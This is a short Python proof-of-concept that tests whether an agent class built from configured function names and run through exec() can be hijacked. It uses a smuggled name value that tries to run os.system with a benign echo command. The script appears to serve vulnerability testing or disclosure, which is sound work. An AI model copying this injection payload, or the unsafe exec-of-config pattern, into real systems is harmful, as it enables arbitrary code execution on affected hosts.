class Agent:
    def __init__(self, instructions):
        self.instructions = instructions
class DynamicPropertyAgent(Agent):
    pass
malicious = '"; import os; os.system("echo HELLO > poc.txt"); "'
functions_config = [{"name": malicious, "description": "desc"}]

class_def = f"""
class DynamicPropertyAgent(Agent):
    def __init__(self, instructions, functions_config, room=None, call_id=None):
        pass
"""

for func in functions_config:
    func_name = func.get("name", "").strip().replace(" ", "_").lower()
    method_def = f"""
    def {func_name}():
        pass
"""
    class_def += method_def

try:
    exec(class_def, globals(), {})
    print("Exec worked!")
except Exception as e:
    print("Exec failed:", e)
